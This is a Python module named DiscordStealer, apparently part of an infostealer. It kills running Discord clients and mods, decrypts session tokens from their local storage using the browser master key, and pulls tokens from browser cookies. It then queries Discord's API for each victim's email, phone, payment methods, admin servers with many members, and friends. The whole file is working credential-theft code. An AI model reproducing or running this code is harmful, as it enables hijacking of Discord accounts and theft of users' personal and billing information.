import os
import re
import json
import base64
import threading
import subprocess
import time
from . import utils

DISCORD_PATHS = [
    (utils.get_appdata() + r'\discord', 'Discord.exe'),
    (utils.get_appdata() + r'\discordcanary', 'DiscordCanary.exe'),
    (utils.get_appdata() + r'\discordptb', 'DiscordPTB.exe'),
    (utils.get_appdata() + r'\discorddevelopment', 'DiscordDevelopment.exe'),
    (utils.get_appdata() + r'\lightcord', 'Lightcord.exe'),
    (utils.get_localappdata() + r'\Discord', 'Discord.exe'),
    (utils.get_localappdata() + r'\discordcanary', 'DiscordCanary.exe'),
    (utils.get_localappdata() + r'\discordptb', 'DiscordPTB.exe'),
    (utils.get_appdata() + r'\Vesktop', 'Vesktop.exe'),
    (utils.get_appdata() + r'\vesktop', 'Vesktop.exe'),
    (utils.get_appdata() + r'\Vencord', 'Vencord.exe'),
    (utils.get_appdata() + r'\vencord', 'Vencord.exe'),
    (utils.get_appdata() + r'\nightcord', 'Nightcord.exe'),
    (utils.get_appdata() + r'\Nightcord', 'Nightcord.exe'),
    (utils.get_localappdata() + r'\Vesktop', 'Vesktop.exe'),
    (utils.get_localappdata() + r'\Vencord', 'Vencord.exe'),
    (utils.get_localappdata() + r'\Nightcord', 'Nightcord.exe'),
    (utils.get_localappdata() + r'\ArmCord', 'ArmCord.exe'),
    (utils.get_appdata() + r'\ArmCord', 'ArmCord.exe'),
]

class DiscordStealer:
    def __init__(self):
        self.tokens = []
        self.token_info = []
        self.killed_processes = []

    def is_process_running(self, exe_name):
        try:
            output = subprocess.check_output('tasklist /fi "IMAGENAME eq ' + exe_name + '" /nh', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            return exe_name.lower() in output.lower()
        except:
            return False

    def kill_discord_process(self, exe_name):
        if self.is_process_running(exe_name):
            try:
                subprocess.run(f'taskkill /f /im {exe_name}', shell=True, capture_output=True, timeout=5)
                self.killed_processes.append(exe_name)
                time.sleep(1)
                return True
            except:
                pass
        return False

    def restart_discord_process(self, exe_name):
        if exe_name in self.killed_processes:
            try:
                exe_path = None
                for path, proc in DISCORD_PATHS:
                    if proc.lower() == exe_name.lower():
                        candidates = [
                            os.path.join(path, proc),
                            os.path.join(os.path.dirname(path), proc),
                            os.path.join(path, '..', proc),
                        ]
                        for c in candidates:
                            if os.path.exists(c):
                                exe_path = c
                                break
                        if exe_path:
                            break
                if not exe_path:
                    import shutil
                    exe_path = shutil.which(exe_name)
                if exe_path:
                    subprocess.Popen(exe_path, shell=True)
            except:
                pass

    def find_tokens_in_path(self, path):
        leveldb = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.exists(leveldb):
            return
        try:
            for file in os.listdir(leveldb):
                if not (file.endswith('.log') or file.endswith('.ldb')):
                    continue
                try:
                    with open(os.path.join(leveldb, file), 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                except:
                    continue
                for pattern in [r'mfa\.[\w-]{80,}', r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}']:
                    for token in re.findall(pattern, content):
                        if token not in self.tokens and self.verify_token(token):
                            self.tokens.append(token)
        except:
            pass

    def find_tokens_in_discord(self, discord_path, exe_name):
        if not os.path.exists(os.path.join(discord_path, 'Local State')):
            self.find_tokens_in_path(discord_path)
            return
        leveldb = os.path.join(discord_path, 'Local Storage', 'leveldb')
        if not os.path.exists(leveldb):
            return
        master_key = utils.get_master_key(os.path.join(discord_path, 'Local State'))
        if not master_key:
            return
        try:
            for file in os.listdir(leveldb):
                if not (file.endswith('.log') or file.endswith('.ldb')):
                    continue
                try:
                    with open(os.path.join(leveldb, file), 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                except:
                    continue
                for match in re.finditer(r'dQw4w9WgXcQ:([^"]+)', content):
                    try:
                        encrypted = base64.b64decode(match.group(1))
                        token = utils.decrypt_chrome_password(encrypted, master_key)
                        if token and token not in self.tokens and self.verify_token(token):
                            self.tokens.append(token)
                    except:
                        pass
        except:
            pass

    def steal_all(self):
        threads = []
        for path, exe_name in DISCORD_PATHS:
            if os.path.exists(path):
                was_running = self.kill_discord_process(exe_name)
                t = threading.Thread(target=self.find_tokens_in_discord, args=(path, exe_name))
                threads.append((t, was_running, exe_name))
                t.start()
        for t, was_running, exe_name in threads:
            t.join()
            if was_running:
                self.restart_discord_process(exe_name)
        for token in self.tokens:
            info = self.get_token_info(token)
            if info:
                self.token_info.append(info)

    def steal_from_browser_cookies(self, cookies_data):
        """Extract Discord tokens from browser cookies"""
        if not cookies_data:
            return
        
        for key, cookie_list in cookies_data.items():
            for cookie_line in cookie_list:
                parts = cookie_line.split('\t')
                if len(parts) >= 7:
                    host = parts[0]
                    name = parts[5]
                    value = parts[6]

                    if 'discord' in host.lower() and name == '__cfruid':
                        continue  # Skip Cloudflare cookie
                    
                    if 'discord' in host.lower() and name in ['__dcfduid', '__sdcfduid']:
                        continue  # Skip Cloudflare cookies

                    if 'discord' in host.lower() and len(value) > 50:

                        token = value
                        if token not in self.tokens and self.verify_token(token):
                            self.tokens.append(token)

    def verify_token(self, token):
        try:
            import requests
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
            return r.status_code == 200
        except:
            return False

    def get_token_info(self, token):
        try:
            import requests
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
            if r.status_code != 200:
                return None
            user = r.json()
            info = {
                'id': user.get('id', ''),
                'username': user.get('username', '') + '#' + user.get('discriminator', '0'),
                'email': user.get('email', 'Not verified'),
                'phone': user.get('phone', 'None'),
                'avatar': 'https://cdn.discordapp.com/avatars/' + str(user.get('id')) + '/' + str(user.get('avatar')) + '.png' if user.get('avatar') else 'https://cdn.discordapp.com/embed/avatars/0.png',
                'nitro': user.get('premium_type', 0),
                'flags': user.get('public_flags', 0),
                'token': token,
                'verified': user.get('verified', False),
                'mfa_enabled': user.get('mfa_enabled', False),
            }
            info['badges'] = self.get_badges(info['flags'])
            info['billing'] = self.get_billing(token)
            info['nitro_str'] = self.get_nitro_string(info['nitro'])
            info['guilds'] = self.get_guilds(token)
            info['friends'] = self.get_friends(token)
            return info
        except:
            return None

    def get_badges(self, flags):
        if flags == 0:
            return 'None'
        badge_map = [
            (1, 'Discord Employee'), (2, 'Partnered Server Owner'),
            (4, 'HypeSquad Events'), (8, 'Bug Hunter L1'),
            (64, 'House Bravery'), (128, 'House Brilliance'),
            (256, 'House Balance'), (512, 'Early Supporter'),
            (16384, 'Bug Hunter L2'), (131072, 'Early Bot Dev'),
        ]
        badges = []
        for value, name in badge_map:
            if flags & value:
                badges.append(name)
        return ', '.join(badges) if badges else 'None'

    def get_nitro_string(self, nitro_type):
        if nitro_type == 1:
            return 'Nitro Classic'
        elif nitro_type == 2:
            return 'Nitro Boost'
        return 'No Nitro'

    def get_billing(self, token):
        try:
            import requests
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=10)
            if r.status_code != 200:
                return 'Locked'
            sources = r.json()
            if not sources:
                return 'None'
            bills = []
            for source in sources:
                if source.get('type') == 1:
                    bills.append('Card')
                elif source.get('type') == 2:
                    bills.append('PayPal')
            return ', '.join(bills) if bills else 'None'
        except:
            return 'Locked'

    def get_guilds(self, token):
        try:
            import requests
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers, timeout=10)
            if r.status_code != 200:
                return [], []
            guilds = r.json()
            hq = []
            all_g = []
            for g in guilds:
                is_admin = g.get('owner', False) or ((g.get('permissions', 0) & 8) == 8)
                members = g.get('approximate_member_count', 0)
                entry = g.get('name', 'Unknown') + ' (' + str(g.get('id', '0')) + ') | Admin:' + str(is_admin) + ' | Members:' + str(members)
                all_g.append(entry)
                if members >= 500 and is_admin:
                    hq.append(entry)
            return all_g, hq
        except:
            return [], []

    def get_friends(self, token):
        try:
            import requests
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=10)
            if r.status_code != 200:
                return []
            friends = r.json()
            result = []
            for f in friends:
                if f.get('type') == 1:
                    user = f.get('user', {})
                    result.append(user.get('username', 'Unknown') + '#' + user.get('discriminator', '0') + ' (' + str(user.get('id', '0')) + ')')
            return result
        except:
            return []
